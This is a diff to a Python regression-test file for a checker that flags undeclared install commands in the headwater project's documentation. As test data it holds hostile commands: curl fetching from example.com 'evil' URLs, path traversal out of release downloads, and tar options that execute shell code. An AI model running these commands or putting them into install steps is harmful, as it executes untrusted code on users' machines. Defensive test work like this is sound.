@@ -269,15 +269,44 @@ REGRESSION_CASES = [
      'main/tools/headwater-bootstrap.sh | sh -s -- --tag '
      'taxonomy/headwater-standard/v4.2.0 --expect sha256:961ecf2ae2c3c74',
      []),
-    ('cargo install, the README route, is not undeclared',
+    ('cargo install, alone in a block, is undeclared: no toolchain is '
+     'mandatory (HW-DR-0077)',
      'cargo install headwater-cli',
+     ['cargo install headwater-cli']),
+    ('the release download is not undeclared',
+     'mkdir -p ~/.local/bin\n'
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz\n'
+     'tar -xzf headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz -C ~/.local/bin headwater',
      []),
-    ('the README source-build block is not undeclared',
-     'git clone https://github.com/headwater-ai/headwater.git\n'
-     'cd headwater\n'
-     'git checkout v0.1.2\n'
-     'cargo build --release -p headwater-cli --manifest-path engine/Cargo.toml --locked',
-     []),
+    ('curl is not declared by verb alone: a URL outside the release '
+     'downloads is undeclared',
+     'curl -fsSLO https://example.com/evil.tar.gz',
+     ['curl -fsSLO https://example.com/evil.tar.gz']),
+    ('curl naming a release download and a second URL is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/x.tar.gz -O https://example.com/evil.sh',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/x.tar.gz -O https://example.com/evil.sh']),
+    ('curl climbing out of the release downloads with .. is undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     '../../../evil/raw/main/x.sh',
+     ['curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+      '../../../evil/raw/main/x.sh']),
+    ('curl reading its URLs from a config file is undeclared',
+     'curl -K evil.cfg https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/x.tar.gz',
+     ['curl -K evil.cfg https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/x.tar.gz']),
+    ('tar handing each member to a command is undeclared',
+     'tar -xzf x.tar.gz --to-command=sh',
+     ['tar -xzf x.tar.gz --to-command=sh']),
+    ('tar running a checkpoint action is undeclared',
+     'tar -xzf x.tar.gz --checkpoint=1 --checkpoint-action=exec=sh',
+     ['tar -xzf x.tar.gz --checkpoint=1 --checkpoint-action=exec=sh']),
+    ('tar with its own decompressor program is undeclared',
+     'tar -I ./evil -xf x.tar',
+     ['tar -I ./evil -xf x.tar']),
     ('step 1 scaffolding is not undeclared',
      'mkdir -p ~/headwater-tutorial/docs/decisions\n'
      'cd ~/headwater-tutorial\n'
@@ -333,6 +362,53 @@ FENCE_REGRESSION_CASES = [
      '```\n',
      ['git clone https://example.com/x & sh tools/evil.sh', 'headwater check']),
 ]
+
+
+# A whole document's command blocks in order, because whether `cargo` may
+# appear depends on what came before it: HW-DR-0077 makes the release
+# download the lead route and `cargo` a labeled alternative after it. Each
+# entry is (label, command blocks in document order, whether the document
+# may offer `cargo` after a download, the undeclared pieces expected).
+DOWNLOAD_BLOCK = (
+    'mkdir -p ~/.local/bin\n'
+    'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+    'v0.2.1/headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz\n'
+    'tar -xzf headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz -C ~/.local/bin headwater')
+SOURCE_BUILD_BLOCK = (
+    'git clone https://github.com/headwater-ai/headwater.git\n'
+    'cd headwater\n'
+    'git checkout v0.2.1\n'
+    'cargo build --release -p headwater-cli --manifest-path engine/Cargo.toml --locked')
+DOCUMENT_REGRESSION_CASES = [
+    ('a document whose only install block is cargo install is reported',
+     ['cargo install headwater-cli'], True,
+     ['cargo install headwater-cli']),
+    ('cargo install after the release download is the labeled alternative',
+     [DOWNLOAD_BLOCK, 'cargo install headwater-cli', SOURCE_BUILD_BLOCK], True,
+     []),
+    ('cargo install before the release download still leads, and is reported',
+     ['cargo install headwater-cli', DOWNLOAD_BLOCK], True,
+     ['cargo install headwater-cli']),
+    ('the tutorial offers no cargo route, even after the download',
+     [DOWNLOAD_BLOCK, 'cargo install headwater-cli'], False,
+     ['cargo install headwater-cli']),
+    ('cargo after a download is still held to install and build',
+     [DOWNLOAD_BLOCK, 'cargo run --manifest-path tools/evil/Cargo.toml'], True,
+     ['cargo run --manifest-path tools/evil/Cargo.toml']),
+]
+
+
+def run_document_regression_cases():
+    """Every case above, checked against `undeclared_in_document`."""
+    failed = []
+    for label, blocks, cargo_may_follow, expected in DOCUMENT_REGRESSION_CASES:
+        got = undeclared_in_document(blocks, cargo_may_follow)
+        ok = got == expected
+        print(('ok   ' if ok else 'FAIL ') + 'document regression: ' + label)
+        if not ok:
+            failed.append(label)
+            print(f'    expected {expected!r}, got {got!r}')
+    return failed
 
 
 def run_fence_regression_cases():
